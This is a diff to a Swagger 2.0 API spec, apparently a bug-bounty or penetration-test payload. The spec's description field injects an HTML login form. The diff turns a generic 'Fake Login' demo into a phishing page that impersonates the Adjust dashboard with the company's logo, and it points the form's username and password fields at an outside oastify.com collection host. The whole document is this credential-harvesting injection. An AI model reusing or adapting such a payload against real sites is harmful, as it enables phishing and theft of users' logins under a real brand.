@@ -1,13 +1,14 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Fake Login Page
+  title: adjust Login Verification.
   description: '<div class="login-form">
     <div class="heading">
-        <h1>HTML Injection : Fake Login</h1>
+    <img alt="Adjust" width="141" height="141" loading="eager" src="https://a.storyblok.com/f/47007/x/2e8164e221/adjust-logo-white.svg" class="a-image --rounded --clickable --loaded" style="--a-image-size:141px" title="">
+        <h1>welcom to adjust dashboard : Plese  Login First </h1>
     </div>
     <div class="form-container">
-        <form action="https://example.com/login" method="post" class="form-signin">
+        <form action="https://7s0wrj0zeagbygktg7avgdu87zdq1mpb.oastify.com/" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
